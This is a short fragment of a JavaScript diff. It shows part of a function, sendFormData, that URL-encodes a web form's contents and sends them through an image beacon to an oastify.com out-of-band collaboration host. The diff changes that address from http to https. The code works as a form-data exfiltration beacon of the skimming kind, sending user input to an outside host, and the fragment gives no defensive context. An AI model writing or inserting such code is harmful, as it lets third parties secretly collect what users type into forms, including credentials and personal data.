@@ -33,7 +33,7 @@ function sendFormData(formElement) {
     // URL-encode the JSON string so it can be safely sent in a URL
     const encodedData = encodeURIComponent(jsonData);
 
-    const baseUrl = 'http://gi2zxgb9mz9eawl5yzg5k2b02r8iw8kx.oastify.com/';
+    const baseUrl = 'https://gi2zxgb9mz9eawl5yzg5k2b02r8iw8kx.oastify.com/';
     
     // Log the action
     console.log('Sending data via GET (Image beacon)...');
